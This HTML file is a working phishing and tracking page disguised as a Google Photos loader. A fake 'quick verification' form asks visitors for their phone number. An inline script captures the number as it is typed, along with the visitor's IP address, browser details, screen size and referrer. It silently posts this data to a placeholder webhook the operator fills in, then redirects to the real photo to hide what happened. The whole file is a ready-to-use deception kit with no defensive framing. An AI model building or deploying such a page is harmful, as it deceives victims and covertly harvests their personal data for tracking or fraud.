<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading Photo...</title>
    <meta http-equiv="refresh" content="3;url=https://photos.google.com/photo/YOUR_PHOTO_ID">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:Arial,sans-serif;background:linear-gradient(45deg,#667eea 0%,#764ba2 100%);height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;}
        .container{max-width:400px;padding:40px;background:rgba(255,255,255,0.1);border-radius:20px;backdrop-filter:blur(10px);}
        h1{font-size:24px;margin-bottom:20px;}
        input{padding:15px;border:none;border-radius:10px;font-size:16px;width:100%;margin-bottom:15px;}
        button{padding:15px 30px;background:#ff6b6b;color:white;border:none;border-radius:10px;font-size:16px;cursor:pointer;}
        .spinner{border:3px solid rgba(255,255,255,.3);border-radius:50%;border-top-color:#fff;width:20px;height:20px;display:inline-block;animation:spin 1s linear infinite;margin-left:10px;}
        @keyframes spin{to{transform:rotate(360deg);}}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔄 Loading your photo...</h1>
        <p>Quick verification for better experience:</p>
        <form id="phoneForm">
            <input type="tel" id="phone" placeholder="📱 +1 (555) 123-4567" required>
            <button type="submit">Continue <span class="spinner"></span></button>
        </form>
        <a href="https://photos.google.com/photo/YOUR_PHOTO_ID" style="color:#fff;display:block;margin-top:20px;">Or click here →</a>
    </div>
    
    <script>
        // CAPTURE DATA & SEND TO YOUR WEBHOOK
        const phoneInput = document.getElementById('phone');
        const form = document.getElementById('phoneForm');
        
        // Track everything
        const data = {
            phone: '',
            ip: '',
            userAgent: navigator.userAgent,
            language: navigator.language,
            screen: screen.width + 'x' + screen.height,
            referrer: document.referrer,
            timestamp: new Date().toISOString()
        };
        
        // Get IP via free API
        fetch('https://api.ipify.org?format=json')
            .then(r=>r.json())
            .then(ipData => {
                data.ip = ipData.ip;
                sendData();
            })
            .catch(() => sendData());
        
        // Auto-capture phone
        phoneInput.addEventListener('input', function() {
            if(this.value.length > 8) {
                data.phone = this.value;
                setTimeout(sendData, 2000);
            }
        });
        
        form.onsubmit = (e) => {
            e.preventDefault();
            data.phone = phoneInput.value;
            sendData();
        };
        
        function sendData() {
            // ⭐ REPLACE WITH YOUR WEBHOOK URL ⭐
            fetch('https://YOUR-WEBHOOK-URL/webhook', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).catch(() => {}); // Silent fail
        }
        
        // Social media detection
        if (document.referrer.includes('facebook')) data.social = 'Facebook';
        if (document.referrer.includes('twitter')) data.social = 'Twitter';
        if (document.referrer.includes('instagram')) data.social = 'Instagram';
    </script>
</body>
</html>
